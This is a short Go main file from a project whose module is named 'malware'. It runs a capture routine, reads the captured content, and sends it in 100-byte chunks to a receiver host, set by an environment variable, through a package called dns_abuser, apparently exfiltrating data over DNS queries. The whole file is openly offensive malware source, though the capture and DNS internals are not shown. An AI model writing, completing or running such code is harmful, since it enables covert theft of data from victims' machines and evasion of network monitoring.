package main

import (
	"fmt"
	"malware/internal/capture"
	"malware/internal/reader"
	"malware/pkg/dns_abuser"
	"os"
	"time"
)

func main() {
	capture.Run()
	time.Sleep(2 * time.Second)

	content, err := reader.ReadInput()
	if err != nil {
		fmt.Println(err)
		return
	}

	receiver := os.Getenv("RECEIVER_HOST")
	if receiver == "" {
		receiver = "127.0.0.1"
	}

	for i := 0; i < len(content); i += 100 {
		if i+100 > len(content) {
			err = dns_abuser.SendData(content[i:], receiver, 5)
			if err != nil {
				fmt.Println(err)
				return
			}
		} else {
			err = dns_abuser.SendData(content[i:i+100], receiver, 5)
			if err != nil {
				fmt.Println(err)
				return
			}
		}
	}

}
